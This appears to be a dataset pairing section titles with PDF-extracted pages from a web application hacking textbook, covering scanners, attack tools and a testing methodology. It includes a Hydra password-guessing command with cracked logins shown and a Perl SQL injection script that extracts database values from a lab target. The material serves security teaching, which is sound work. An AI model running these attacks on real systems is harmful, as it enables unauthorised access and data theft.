reason, but an automated\nscanner lacks this understanding.\nIndividuating Functionality\nThere are many situations in which a purely syntactic analysis of an application\nfails to correctly identify its core set of individual functions:\nn Some applications contain a colossal quantity of content that embodies\nthe same core set of functionality. For example, applications such as eBay,\nMySpace, and Amazon contain millions of different application pages\nwith different URLs and content, yet these correspond to a relatively small\nnumber of actual application functions.\nn Some applications may have no fi nite boundary when analyzed from a\npurely syntactic perspective. For example, a calendar application may\nallow users to navigate to any date. Similarly, some applications with a\nfi nite amount of content employ volatile URLs or request parameters to\naccess the same content on different occasions, leading scanners to con-\ntinue mapping indefi nitely.\nn The scanner’s own actions may result in the appearance of seemingly new\ncontent. For example, submitting a form may cause a new link to appear\nin the application’s interface, and accessing the link may retrieve a further\nform that has the same behavior.\ncc2200..iinndddd 777799 88//1199//22001111 1122::2211::1100 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 780\n780 Chapter 20 n A Web Application Hacker’s Toolkit\nIn any of these situations, a human attacker can quickly “see through” the\napplication’s syntactic content and identify the core set of actual functions that\nneed to be tested. For an automated scanner with no semantic understanding,\nthis is considerably harder to do.\nAside from the obvious problems of mapping and probing the application\nin the situations described, a related problem arises in the reporting of discov-\nered vulnerabilities. A scanner based on purely syntactic analysis is prone to\ngenerating duplicate fi ndings for each single vulnerability. For example, a scan\nreport might identify 200 XSS fl aws, 195 of which arise in the same application\nfunction that the scanner probed multiple times because it appears in different\ncontexts with different syntactic content.\nOther Challenges to Automation\nAs discussed in Chapter 14, some applications implement defensive measures\nspecifi cally designed to prevent them from being accessed by automated client\nprograms. These measures include reactive session termination in the event of\nanomalous activity and the use of CAPTCHAs and other controls designed to\nensure that a human being is responsible for particular requests.\nIn general, the scanner’s spidering function faces the same challenges as web\napplication spiders more generally, such as customized “not found” responses\nand the ability to interpret client-side code. Many applications implement fi ne-\ngrained validation over particular items of input, such as the fi elds on a user\nregistration form. If the spider populates the form with invalid input and is\nunable to understand the error messages generated by the application, it may\nnever proceed beyond this form to some important functions lying behind it.\nThe rapid evolution of web technologies, particularly the use of browser\nextension components and other frameworks on the client side, means that most\nscanners lag behind the latest trends. This can result in failures to identify all\nthe relevant requests made within the application, or the precise format and\ncontents of requests that the application requires.\nFurthermore, the highly stateful nature of today’s web applications, with\ncomplex data being held on both the client and server side, and updated via\nasynchronous communications between the two, creates problems for most fully\nautomated scanners, which tend to work on each request in isolation. To gain\ncomplete coverage of these applications, it is often necessary to understand the\nmultistage request processes that they involve and to ensure that the application\nis in the desired state to handle a particular attack request. Chapter 14 describes\ntechniques for achieving this within custom automated attacks. They generally\ncc2200..iinndddd 778800 88//1199//22001111 1122::2211::1100 PPMM"
  },
  {
    "input": "Current Products",
    "output": "Stuttard c20.indd V3 - 08/16/2011 Page 781\nChapter 20 n A Web Application Hacker’s Toolkit 781\nrequire intelligent human involvement to understand the requirements, confi gure\nthe testing tools appropriately, and monitor their performance.\nCurrent Products\nThe market for automated web scanners has thrived in recent years, with a great\ndeal of innovation and a wide range of different products. Here are some of the\nmore prominent scanners:\nn Acunetix\nn AppScan\nn Burp Scanner\nn Hailstorm\nn NetSparker\nn N-Stalker\nn NTOSpider\nn Skipfi sh\nn WebInspect\nAlthough most mature scanners share a common core of functionality, they\nhave differences in their approaches to detecting different areas of vulnerabili-\nties and in the functionality presented to the user. Public discussions about\nthe merits of different scanners often degenerate into mudslinging between\nvendors. Various surveys have been performed to evaluate the performance of\ndifferent scanners in detecting different types of security fl aws. Such surveys\nalways involve running the scanners against a small sample of vulnerable code.\nThis may limit the extrapolation of the results to the wide range of real-world\nsituations in which scanners may be used.\nThe most effective surveys run each scanner against a wide range of sample\ncode that is derived from real-world applications, without giving vendors an\nopportunity to adjust their product to the sample code before the analysis. One\nsuch academic study by the University of California, Santa Barbara, claims to\nbe “the largest evaluation of web application scanners in terms of the number\nof tested tools ... and the class of vulnerabilities analyzed.” You can download\nthe report from the study at the following URL:\nwww.cs.ucsb.edu/~adoupe/static/black-box-scanners-dimva2010.pdf\ncc2200..iinndddd 778811 88//1199//22001111 1122::2211::1100 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 782\n782 Chapter 20 n A Web Application Hacker’s Toolkit\nThe main conclusions of this study were as follows:\nn Whole classes of vulnerabilities cannot be detected by state-of-the-art scan-\nners, including weak passwords, broken access controls, and logic fl aws.\nn The crawling of modern web applications can be a serious challenge for\ntoday’s web vulnerability scanners due to incomplete support for com-\nmon client-side technologies and the complex stateful nature of today’s\napplications.\nn There is no strong correlation between price and capability. Some free or\nvery cost-effective scanners perform as well as scanners that cost thou-\nsands of dollars.\nThe study assigned each scanner a score based on its ability to identify dif-\nferent types of vulnerabilities. Table 20-1 shows the overall scores and the price\nof each scanner.\nTable 20-1: Vulnerability Detection Performance and Prices of Different Scanners According\nto the UCSB Study\nSCANNER SCORE PRICE\nAcunetix 14 $4,995 to $6,350\nWebInspect 13 $6,000 to $30,000\nBurp Scanner 13 $191\nN-Stalker 13 $899 to $6,299\nAppScan 10 $17,550 to $32,500\nw3af 9 Free\nParos 6 Free\nHailStorm 6 $10,000\nNTOSpider 4 $10,000\nMileSCAN 4 $495 to $1,495\nGrendel-Scan 3 Free\nIt should be noted that scanning capabilities have evolved considerably in\nrecent years and are likely to continue to do so. Both the performance and\nprice of individual scanners are likely to change over time. The UCSB study\nthat reported the information shown in Table 20-1 was published in June 2010.\nBecause of the relative scarcity of reliable public information about the per-\nformance of web vulnerability scanners, it is recommended that you do your\nown research before making any purchase. Most scan vendors provide detailed\nproduct documentation and free trial editions of their software, which you can\nuse to help inform your product selection.\ncc2200..iinndddd 778822 88//1199//22001111 1122::2211::1111 PPMM"
  },
  {
    "input": "Using a Vulnerability Scanner",
    "output": "Stuttard c20.indd V3 - 08/16/2011 Page 783\nChapter 20 n A Web Application Hacker’s Toolkit 783\nUsing a Vulnerability Scanner\nIn real-world situations, the effectiveness of using a vulnerability scanner depends\nlargely on the application you are targeting. The inherent strengths and weak-\nnesses that we have described affect different applications in different ways,\ndepending on the types of functionality and vulnerabilities they contain.\nOf the various kinds of vulnerabilities commonly found within web applica-\ntions, automated scanners are inherently capable of discovering approximately\nhalf of these, where a standard signature exists. Within the subset of vulnerability\ntypes that scanners can detect, they do a good job of identifying individual cases,\nalthough they miss the more subtle and unusual instances of these. Overall,\nyou may expect that running an automated scan will identify some but not all\nof the low-hanging fruit within a typical application.\nIf you are a novice, or you are attacking a large application and have limited\ntime, running an automated scan can bring clear benefi ts. It will quickly identify\nseveral leads for further manual investigation, enabling you to get an initial\nhandle on the application’s security posture and the types of fl aws that exist.\nIt will also provide you with a useful overview of the target application and\nhighlight any unusual areas that warrant further detailed attention.\nIf you are an expert at attacking web applications, and you are serious about\nfi nding as many vulnerabilities as possible within your target, you are all too\naware of the inherent limitations of vulnerability scanners. Therefore, you will\nnot fully trust them to completely cover any individual category of vulnerabil-\nity. Although the results of a scan will be interesting and will prompt manual\ninvestigation of specifi c issues, you will typically want to perform a full manual\ntest of every area of the application for every type of vulnerability to satisfy\nyourself that the job has been done properly.\nIn any situation where you employ a vulnerability scanner, you should\nkeep in mind some key points to ensure that you make the most effective\nuse of it:\nn Be aware of the kinds of vulnerabilities that scanners can detect and those\nthat they cannot.\nn Be familiar with your scanner’s functionality, and know how to leverage\nits confi guration to be the most effective against a given application.\nn Familiarize yourself with the target application before running your scan-\nner so that you can make the most effective use of it.\nn Be aware of the risks associated with spidering powerful functionality\nand automatically probing for dangerous bugs.\nn Always manually confi rm any potential vulnerabilities reported by the\nscanner.\ncc2200..iinndddd 778833 88//1199//22001111 1122::2211::1111 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 784\n784 Chapter 20 n A Web Application Hacker’s Toolkit\nn Be aware that scanners are extremely noisy and leave a signifi cant foot-\nprint in the logs of the server and any IDS defenses. Do not use a scanner\nif you want to be stealthy.\nFully Automated Versus User-Directed Scanning\nA key consideration in your usage of web scanners is the extent to which you\nwant to direct the work done by the scanner. The two extreme use cases in this\ndecision are as follows:\nn You want to give your scanner the URL for the application, click Go, and\nwait for the results.\nn You want to work manually and use a scanner to test individual requests\nin isolation, alongside your manual testing.\nStandalone web scanners are geared more toward the fi rst of these use cases.\nThe scanners that are incorporated into integrated testing suites are geared\nmore toward the second use case. That said, both types of scanners allow you\nto adopt a more hybrid approach if you want to.\nFor users who are novices at web application security, or who require\na quick assessment of an application, or who deal with a large number of\napplications on a regular basis, a fully automated scan will provide some\ninsight into part of the application’s attack surface. This may help you make\nan informed decision about what level of more comprehensive testing is\nwarranted for the application.\nFor users who understand how web application security testing is done\nand who know the limitations of total automation, the best way to use a scan-\nner is within an integrated testing suite to support and enhance the manual\ntesting process. This approach helps avoid many of the technical challenges\nfaced by fully automated scanners. You can guide the scanner using your\nbrowser to ensure that no key areas of functionality are missed. You can\ndirectly scan the actual requests generated by the application, containing\ndata with the correct content and format that the application requires. With\nfull control over what gets scanned, you can avoid dangerous functionality,\nrecognize duplicated functionality, and step through any input validation\nrequirements that an automated scanner might struggle with. Furthermore,\nwhen you have direct feedback about the scanner’s activity, you can ensure\nthat problems with authentication and session handling are avoided and that\nissues caused by multistage processes and stateful functions are handled\nproperly. By using a scanner in this way, you can cover an important range\nof vulnerabilities whose detection can be automated. This will free you to\nlook for the types of vulnerabilities that require human intelligence and\nexperience to uncover.\ncc2200..iinndddd 778844 88//1199//22001111 1122::2211::1111 PPMM"
  },
  {
    "input": "Hydra",
    "output": "Stuttard c20.indd V3 - 08/16/2011 Page 785\nChapter 20 n A Web Application Hacker’s Toolkit 785\nOther Tools\nIn addition to the tools already discussed, you may fi nd countless others use-\nful in a specifi c situation or to perform a particular task. The remainder of this\nchapter describes a few other tools you are likely to encounter and use when\nattacking applications. It should be noted that this is only a brief survey of\nsome tools that the authors have used. It is recommended that you investigate\nthe various tools available for yourself, and choose those which best meet your\nneeds and testing style.\nWikto/Nikto\nNikto is useful for locating default or common third-party content that exists\non a web server. It contains a large database of fi les and directories, including\ndefault pages and scripts that ship with web servers, and third-party items such\nas shopping cart software. The tool essentially works by requesting each item\nin turn and detecting whether it exists.\nThe database is updated frequently, meaning that Nikto typically is more\neffective than any other automated or manual technique for identifying this\ntype of content.\nNikto implements a wide range of confi guration options, which can be speci-\nfi ed on the command line or via a text-based confi guration fi le. If the application\nuses a customized “not found” page, you can avoid false positives by using the\n-404 setting, which enables you to specify a string that appears in the custom\nerror page.\nWikto is a Windows version of Nikto that has some additional features, such\nas enhanced detection of custom “not-found” responses and Google-assisted\ndirectory mining.\nFirebug\nFirebug is a browser debugging tool that lets you debug and edit HTML and\nJavaScript in real time on the currently displayed page. You can also explore\nand edit the DOM.\nFirebug is extremely powerful for analyzing and exploiting a wide range of\nclient-side attacks, including all kinds of cross-site scripting, request forgery\nand UI redress, and cross-domain data capture, as described in Chapter 13.\nHydra\nHydra is a password-guessing tool that can be used in a wide range of situa-\ntions, including with the forms-based authentication commonly used in web\ncc2200..iinndddd 778855 88//1199//22001111 1122::2211::1111 PPMM"
  },
  {
    "input": "Custom Scripts",
    "output": "Stuttard c20.indd V3 - 08/16/2011 Page 786\n786 Chapter 20 n A Web Application Hacker’s Toolkit\napplications. Of course, you can use a tool such as Burp Intruder to execute any\nattack of this kind in a completely customized way; however, in many situations\nHydra can be just as useful.\nHydra enables you to specify the target URL, the relevant request parameters,\nword lists for attacking the username and password fi elds, and details of the error\nmessage that is returned following an unsuccessful login. The -t setting can be\nused to specify the number of parallel threads to use in the attack. For example:\nC:\\>hydra.exe –t 32 -L user.txt -P password.txt wahh-app.com http-post-form\n“/login.asp:login_name=^USER^&login_password=^PASS^&login=Login:Invalid”\nHydra v6.4 (c) 2011 by van Hauser / THC - use allowed only for legal\npurposes.\nHydra (http://www.thc.org) starting at 2011-05-22 16:32:48\n[DATA] 32 tasks, 1 servers, 21904 login tries (l:148/p:148), ~684 tries per\ntask\n[DATA] attacking service http-post-form on port 80\n[STATUS] 397.00 tries/min, 397 tries in 00:01h, 21507 todo in 00:55h\n[80][www-form] host: 65.61.137.117 login: alice password: password\n[80][www-form] host: 65.61.137.117 login: liz password: password\n...\nCustom Scripts\nIn the authors’ experience, the various off-the-shelf tools that exist are suffi cient\nto help you perform the vast majority of tasks that you need to carry out when\nattacking a web application. However, in various unusual situations you will\nneed to create your own customized tools and scripts to address a particular\nproblem. For example:\nn The application uses an unusual session-handling mechanism, such as one that\ninvolves per-page tokens that must be resubmitted in the correct sequence.\nn You want to exploit a vulnerability that requires several specifi c steps to be\nperformed repeatedly, with data retrieved on one response incorporated\ninto subsequent requests.\nn The application aggressively terminates your session when it identifi es a\npotentially malicious request, and acquiring a fresh authenticated session\nrequires several nonstandard steps.\nn You need to provide a “point and click” exploit to an application owner\nto demonstrate the vulnerability and the risk.\nIf you have some programming experience, the easiest way to address prob-\nlems of this kind is to create a small, fully customized program to issue the\nrelevant requests and process the application’s responses. You can produce this\neither as a standalone tool or as an extension to one of the integrated testing\ncc2200..iinndddd 778866 88//1199//22001111 1122::2211::1122 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 787\nChapter 20 n A Web Application Hacker’s Toolkit 787\nsuites described earlier. For example, you can use the Burp Extender interface\nto extend Burp Suite or the BeanShell interface to extend WebScarab.\nScripting languages such as Perl contain libraries to help make HTTP com-\nmunication straightforward, and you often can carry out customized tasks using\nonly a few lines of code. Even if you have limited programming experience, you\noften can fi nd a script on the Internet that you can tweak to meet your require-\nments. The following example shows a simple Perl script that exploits a SQL\ninjection vulnerability in a search form to make recursive queries and retrieve\nall the values in a specifi ed table column. It starts with the highest value and\niterates downward (see Chapter 9 for more details on this kind of attack):\nuse HTTP::Request::Common;\nuse LWP::UserAgent;\n$ua = LWP::UserAgent->new();\nmy $col = @ARGV[1];\nmy $from_stmt = @ARGV[3];\nif ($#ARGV!=3) {\nprint “usage: perl sql.pl SELECT column FROM table\\n”;\nexit;\n}\nwhile(1)\n{\n$payload = “foo’ or (1 in (select max($col) from $from_stmt\n$test))--”;\nmy $req = POST “http://mdsec.net/addressbook/32/Default.aspx”,\n[__VIEWSTATE => ‘’, Name => $payload, Email => ‘john@test.\ncom’, Phone =>\n‘12345’, Search => ‘Search’, Address => ‘1 High Street’, Age =>\n‘30’,];\nmy $resp = $ua->request($req);\nmy $content = $resp->as_string;\n#print $content;\nif ($content =~ /nvarchar value ‘(.*)’/)\n{\nprint “$1\\n”; # print the extracted match\n}\nelse\n{exit;}\n$test = “where $col < ‘$1’”;\n}\ncc2200..iinndddd 778877 88//1199//22001111 1122::2211::1122 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 788\n788 Chapter 20 n A Web Application Hacker’s Toolkit\nTRY IT!\nhttp://mdsec.net/addressbook/32/\nIn addition to built-in commands and libraries, you can call out to various\nsimple tools and utilities from Perl scripts and operating system shell scripts.\nSome tools that are useful for this purpose are described next.\nWget\nWget is a handy tool for retrieving a specifi ed URL using HTTP or HTTPS.\nIt can support a downstream proxy, HTTP authentication, and various other\nconfi guration options.\nCurl\nCurl is one of the most fl exible command-line tools for issuing HTTP and HTTPS\nrequests. It supports GET and POST methods, request parameters, client SSL\ncertifi cates, and HTTP authentication. In the following example, the page title\nis retrieved for page ID values between 10 and 40:\n#!/bin/bash\nfor i in `seq 10 40`;\ndo\necho -n $i “: “\ncurl -s http://mdsec.net/app/ShowPage.ashx?PageNo==$i | grep -Po\n“<title>(.*)</title>” | sed ‘s/.......\\(.*\\)......../\\1/’\ndone\nTRY IT!\nhttp://mdsec.net/app/\nNetcat\nNetcat is a versatile tool that can be used to perform numerous network-related\ntasks. It is a cornerstone of many beginners’ hacking tutorials. You can use it to\nopen a TCP connection to a server, send a request, and retrieve the response.\nIn addition to this use, Netcat can be used to create a network listener on your\ncomputer to receive connections from a server you are attacking. See Chapter 9\ncc2200..iinndddd 778888 88//1199//22001111 1122::2211::1122 PPMM"
  },
  {
    "input": "Summary",
    "output": "Stuttard c20.indd V3 - 08/16/2011 Page 789\nChapter 20 n A Web Application Hacker’s Toolkit 789\nfor an example of this technique being used to create an out-of-band channel\nin a database attack.\nNetcat does not itself support SSL connections, but this can be achieved if\nyou use it in combination with the stunnel tool, described next.\nStunnel\nStunnel is useful when you are working with your own scripts or other tools\nthat do not themselves support HTTPS connections. Stunnel enables you to\ncreate client SSL connections to any host, or server SSL sockets to listen for\nincoming connections from any client. Because HTTPS is simply the HTTP\nprotocol tunneled over SSL, you can use stunnel to provide HTTPS capabili-\nties to any other tool.\nFor example, the following command shows stunnel being confi gured to cre-\nate a simple TCP server socket on port 88 of the local loopback interface. When\na connection is received, stunnel performs an SSL negotiation with the server\nat wahh-app.com, forwarding the incoming cleartext connection through the\nSSL tunnel to this server:\nC:\\bin>stunnel -c -d localhost:88 -r wahh-app.com:443\n2011.01.08 15:33:14 LOG5[1288:924]: Using ‘wahh-app.com.443’ as\ntcpwrapper service name\n2011.01.08 15:33:14 LOG5[1288:924]: stunnel 3.20 on x86-pc-\nmingw32-gnu WIN32\nYou can now simply point any tool that is not SSL-capable at port 88 on the\nloopback interface. This effectively communicates with the destination server\nover HTTPS:\n2011.01.08 15:33:20 LOG5[1288:1000]: wahh-app.com.443 connected\nfrom 127.0.0.1:1113\n2011.01.08 15:33:26 LOG5[1288:1000]: Connection closed: 16 bytes\nsent to SSL, 392 bytes sent to socket\nSummary\nThis book has focused on the practical techniques you can use to attack web\napplications. Although you can carry out some of these tasks using only a\nbrowser, to perform an effective and comprehensive attack of an application,\nyou need some tools.\nThe most important and indispensable tool in your arsenal is the intercepting\nproxy, which enables you to view and modify all traffi c passing in both direc-\ntions between browser and server. Today’s proxies are supplemented with a\ncc2200..iinndddd 778899 88//1199//22001111 1122::2211::1122 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 790\n790 Chapter 20 n A Web Application Hacker’s Toolkit\nwealth of other integrated tools that can help automate many of the tasks you\nwill need to perform. In addition to one of these tool suites, you need to use one\nor more browser extensions that enable you to continue working in situations\nwhere a proxy cannot be used.\nThe other main type of tool you may employ is a standalone web application\nscanner. These tools can be effective at quickly discovering a range of common\nvulnerabilities, and they can also help you map and analyze an application’s\nfunctionality. However, they are unable to identify many kinds of security\nfl aws, and you can’t rely on them to give a completely clean bill of health to\nany application.\nUltimately, what will make you an accomplished web application hacker is\nyour ability to understand how web applications function, where their defenses\nbreak down, and how to probe them for exploitable vulnerabilities. To do this\neffectively, you need tools that enable you to look under the hood, to manipu-\nlate your interaction with applications in a fi ne-grained way, and to leverage\nautomation wherever possible to make your attacks faster and more reliable.\nWhichever tools you fi nd most useful in achieving these objectives are the right\nones for you. And if the available tools don’t meet your needs, you can always\ncreate your own. It isn’t that diffi cult, honest.\ncc2200..iinndddd 779900 88//1199//22001111 1122::2211::1122 PPMM"
  },
  {
    "input": "Chapter 21 A Web Application Hacker’s Methodology",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 791\nCHAPTER\n21\nA Web Application Hacker’s\nMethodology\nThis chapter contains a detailed step-by-step methodology you can follow when\nattacking a web application. It covers all the categories of vulnerabilities and\nattack techniques described in this book. Following all the steps in this meth-\nodology will not guarantee that you discover all the vulnerabilities within a\ngiven application. However, it will provide you with a good level of assurance\nthat you have probed all the necessary regions of the application’s attack surface\nand have found as many issues as possible given the resources available to you.\nFigure 21-1 illustrates the main areas of work that this methodology describes.\nWe will drill down into this diagram and illustrate the subdivision of tasks that\neach area involves. The numbers in the diagrams correspond to the hierarchical\nnumbered list used in the methodology, so you can easily jump to the actions\ninvolved in a specifi c area.\nThe methodology is presented as a sequence of tasks that are organized and\nordered according to the logical interdependencies between them. As far as pos-\nsible, these interdependencies are highlighted in the task descriptions. However,\nin practice you will frequently need to think imaginatively about the direction\nin which your activities should go and allow these to be guided by what you\ndiscover about the application you are attacking. For example:\nn Information gathered in one stage may enable you to return to an earlier\nstage and formulate more focused attacks. For example, an access control\nbug that enables you to obtain a listing of all users may enable you to\n791\ncc2211..iinndddd 779911 88//1199//22001111 1122::2222::0011 PPMM\nStuttard c21.indd V3 - 08/16/2011 Page 792\n792 Chapter 21 n A Web Application Hacker’s Methodology\nperform a more effective password-guessing attack against the authen-\ntication function.\nn Discovering a key vulnerability in one area of the application may enable\nyou to shortcut some of the work in other areas. For example, a fi le disclosure\nvulnerability may enable to you perform a code review of key application\nfunctions rather than probing them in a solely black-box manner.\nn The results of your testing in some areas may highlight patterns of recur-\nring vulnerabilities that you can immediately probe for in other areas.\nFor example, a generic defect in the application’s input validation fi lters\nmay enable you to quickly fi nd a bypass of its defenses against several\ndifferent categories of attack.\nRecon and analysis\n1. Map application content\n2. Analyze the application\nApplication logic Access handling Input handling Application hosting\n3. Test client-side 4. Test 7. Fuzz all 10. Test for shared\ncontrols authentication parameters hosting issues\n8. Test for issues\n9. Test for logic 5. Test session 11. Test the web\nwith specific\nflaws management server\nfunctionality\n6. Test access\ncontrols\n12. Miscellaneous 13. Information\nChecks Leakage\nFigure 21-1: The main areas of work involved in the methodology\nUse the steps in this methodology to guide your work, and as a checklist to\navoid oversights, but do not feel obligated to adhere to them too rigidly. Keep\ncc2211..iinndddd 779922 88//1199//22001111 1122::2222::0011 PPMM"
  },
  {
    "input": "General Guidelines",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 793\nChapter 21 n A Web Application Hacker’s Methodology 793\nthe following thought in mind: the tasks we describe are largely standard and\northodox; the most impressive attacks against web applications always involve\nthinking beyond them.\nGeneral Guidelines\nYou should always keep in mind some general considerations when carrying out\nthe detailed tasks involved in attacking a web application. These may apply to all\nthe different areas you need to examine and techniques you need to carry out.\nn Remember that several characters have special meaning in different parts\nof the HTTP request. When you are modifying the data within requests,\nyou should URL-encode these characters to ensure that they are interpreted\nin the way you intend:\nn & is used to separate parameters in the URL query string and message\nbody. To insert a literal & character, you should encode this as %26.\nn = is used to separate the name and value of each parameter in the URL\nquery string and message body. To insert a literal = character, you\nshould encode this as %3d.\nn ? is used to mark the beginning of the URL query string. To insert a\nliteral? character, you should encode this as %3f.\nn A space is used to mark the end of the URL in the fi rst line of requests\nand can indicate the end of a cookie value in the Cookie header. To\ninsert a literal space, you should encode this as %20 or +.\nn Because+ represents an encoded space, to insert a literal + character,\nyou should encode this as %2b.\nn ; is used to separate individual cookies in the Cookie header. To insert\na literal ; character, you should encode this as %3b.\nn # is used to mark the fragment identifi er within the URL. If you enter\nthis character into the URL within your browser, it effectively truncates\nthe URL that is sent to the server. To insert a literal # character, you\nshould encode this as %23.\nn % is used as the prefi x in the URL-encoding scheme. To insert a literal\n% character, you should encode this as %25.\nn Any nonprinting characters such as null bytes and newlines must, of\ncourse, be URL-encoded using their ASCII character code — in this\ncase, as %00 and %0a, respectively.\nn Furthermore, note that entering URL-encoded data into a form usually\ncauses your browser to perform another layer of encoding. For example,\ncc2211..iinndddd 779933 88//1199//22001111 1122::2222::0011 PPMM\nStuttard c21.indd V3 - 08/16/2011 Page 794\n794 Chapter 21 n A Web Application Hacker’s Methodology\nsubmitting%00 in a form will probably result in a value of %2500 being\nsent to the server. For this reason it is normally best to observe the fi nal\nrequest within an intercepting proxy.\nn Many tests for common web application vulnerabilities involve sending\nvarious crafted input strings and monitoring the application’s responses\nfor anomalies, which indicate that a vulnerability is present. In some\ncases, the application’s response to a particular request contains a signa-\nture of a particular vulnerability, regardless of whether a trigger for that\nvulnerability has been submitted. In any case where specifi c crafted input\nresults in behavior associated with a vulnerability (such as a particular\nerror message), you should double-check whether submitting benign\ninput in the relevant parameter also causes the same behavior. If it does,\nyour tentative fi nding is probably a false positive.\nn Applications typically accumulate an amount of state from previous requests,\nwhich affects how they respond to further requests. Sometimes, when you\nare trying to investigate a tentative vulnerability and isolate the precise\ncause of a particular piece of anomalous behavior, you must remove the\neffects of any accumulated state. To do so, it is usually suffi cient to begin\na fresh session with a new browser process, navigate to the location of the\nobserved anomaly using only benign requests, and then resubmit your\ncrafted input. You can often replicate this measure by adjusting the parts\nof your requests containing cookies and caching information. Furthermore,\nyou can use a tool such as Burp Repeater to isolate a request, make specifi c\nadjustments to it, and reissue it as many times as you require.\nn Some applications use a load-balanced confi guration in which consecu-\ntive HTTP requests may be handled by different back-end servers at the\nweb, presentation, data, or other tiers. Different servers may have small\ndifferences in confi guration that affect your results. Furthermore, some\nsuccessful attacks will result in a change in the state of the specifi c server\nthat handles your requests — such as the creation of a new fi le within the\nweb root. To isolate the effects of particular actions, it may be necessary\nto perform several identical requests in succession, testing the result of\neach until your request is handled by the relevant server.\nAssuming that you are implementing this methodology as part of a consul-\ntancy engagement, you should always be sure to carry out the usual scoping\nexercise to agree precisely which hostnames, URLs, and functionality are to\nbe included, and whether any restrictions exist on the types of testing you are\npermitted to perform. You should make the application owner aware of the\ninherent risks involved in performing any kind of penetration testing against\na black-box target. Advise the owner to back up any important data before you\ncommence your work.\ncc2211..iinndddd 779944 88//1199//22001111 1122::2222::0011 PPMM"
  },
  {
    "input": "1.1 Explore Visible Content",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 795\nChapter 21 n A Web Application Hacker’s Methodology 795\n1 Map the Application’s Content\nLinked content Other content Non-standard\naccess methods\n1.1. Explore visible 1.3. Discover 1.5. Identifier-\ncontent hidden content specified functions\n1.2. Consult public 1.4. Discover 1.6. Debug\nresources default content parameters\nFigure 21-2: Mapping the application’s content\n1.1 Explore Visible Content\n1.1.1 Confi gure your browser to use your favorite integrated proxy/spidering\ntool. Both Burp and WebScarab can be used to passively spider the site\nby monitoring and parsing web content processed by the proxy.\n1.1.2 If you fi nd it useful, confi gure your browser to use an extension such\nas IEWatch to monitor and analyze the HTTP and HTML content being\nprocessed by the browser.\n1.1.3 Browse the entire application in the normal way, visiting every link and\nURL, submitting every form, and proceeding through all multistep func-\ntions to completion. Try browsing with JavaScript enabled and disabled,\nand with cookies enabled and disabled. Many applications can handle\nvarious browser confi gurations, and you may reach different content\nand code paths within the application.\n1.1.4 If the application uses authentication, and you have or can create a login\naccount, use this to access the protected functionality.\n1.1.5 As you browse, monitor the requests and responses passing through\nyour intercepting proxy to gain an understanding of the kinds of data\nbeing submitted and the ways in which the client is used to control the\nbehavior of the server-side application.\n1.1.6 Review the site map generated by the passive spidering, and identify any\ncontent or functionality that you have not walked through using your\nbrowser. From the spider results, establish where each item was discov-\nered (for example, in Burp Spider, check the Linked From details). Access\neach item using your browser so that the spider parses the response from\nthe server to identify any further content. Continue this step recursively\nuntil no further content or functionality is identifi ed.\ncc2211..iinndddd 779955 88//1199//22001111 1122::2222::0011 PPMM"
  },
  {
    "input": "1.3 Discover Hidden Content",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 796\n796 Chapter 21 n A Web Application Hacker’s Methodology\n1.1.7 When you have fi nished manually browsing and passively spidering,\nyou can use your spider to actively crawl the application, using the set\nof discovered URLs as seeds. This may sometimes uncover additional\ncontent that you overlooked when working manually. Before doing an\nautomated crawl, fi rst identify any URLs that are dangerous or likely to\nbreak the application session, and then confi gure the spider to exclude\nthese from its scope.\n1.2 Consult Public Resources\n1.2.1 Use Internet search engines and archives (such as the Wayback Machine)\nto identify what content they have indexed and stored for your target\napplication.\n1.2.2 Use advanced search options to improve the effectiveness of your research.\nFor example, on Google you can use site: to retrieve all the content for\nyour target site and link: to retrieve other sites that link to it. If your\nsearch identifi es content that is no longer present in the live application,\nyou may still be able to view this from the search engine’s cache. This\nold content may contain links to additional resources that have not yet\nbeen removed.\n1.2.3 Perform searches on any names and e-mail addresses you have discov-\nered in the application’s content, such as contact information. Include\nitems not rendered on-screen, such as HTML comments. In addition to\nweb searches, perform news and group searches. Look for any technical\ndetails posted to Internet forums regarding the target application and\nits supporting infrastructure.\n1.2.4 Review any published WSDL fi les to generate a list of function names\nand parameter values potentially employed by the application.\n1.3 Discover Hidden Content\n1.3.1 Confi rm how the application handles requests for nonexistent items.\nMake some manual requests for known valid and invalid resources,\nand compare the server’s responses to establish an easy way to identify\nwhen an item does not exist.\n1.3.2 Obtain listings of common fi le and directory names and common fi le\nextensions. Add to these lists all the items actually observed within the\napplications, and also items inferred from these. Try to understand the\nnaming conventions used by application developers. For example, if\nthere are pages called AddDocument.jsp and ViewDocument.jsp, there\nmay also be pages called EditDocument.jsp and RemoveDocument.jsp.\ncc2211..iinndddd 779966 88//1199//22001111 1122::2222::0011 PPMM"
  },
  {
    "input": "1.5 Enumerate Identifier-Specified Functions",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 797\nChapter 21 n A Web Application Hacker’s Methodology 797\n1.3.3 Review all client-side code to identify any clues about hidden server-side\ncontent, including HTML comments and disabled form elements.\n1.3.4 Using the automation techniques described in Chapter 14, make large\nnumbers of requests based on your directory, fi lename, and fi le extension\nlists. Monitor the server’s responses to confi rm which items are present\nand accessible.\n1.3.5 Perform these content-discovery exercises recursively, using new enumer-\nated content and patterns as the basis for further user-directed spidering\nand further automated discovery.\n1.4 Discover Default Content\n1.4.1 Run Nikto against the web server to detect any default or well-known\ncontent that is present. Use Nikto’s options to maximize its effective-\nness. For example, you can use the –root option to specify a directory\nto check for default content, or -404 to specify a string that identifi es a\ncustom File Not Found page.\n1.4.2 Verify any potentially interesting fi ndings manually to eliminate any\nfalse positives within the results.\n1.4.3 Request the server’s root directory, specifying the IP address in the\nHost header, and determine if the application responds with any dif-\nferent content. If so, run a Nikto scan against the IP address as well as\nthe server name.\n1.4.4 Make a request to the server’s root directory, specifying a range of\nUser-Agent headers, as shown at www.useragentstring.com/pages/\nuseragentstring.php.\n1.5 Enumerate Identifi er-Specifi ed Functions\n1.5.1 Identify any instances where specifi c application functions are accessed by\npassing an identifi er of the function in a request parameter (for example,\n/admin.jsp?action=editUser or /main.php?func=A21).\n1.5.2 Apply the content discovery techniques used in step 1.3 to the mechanism\nbeing used 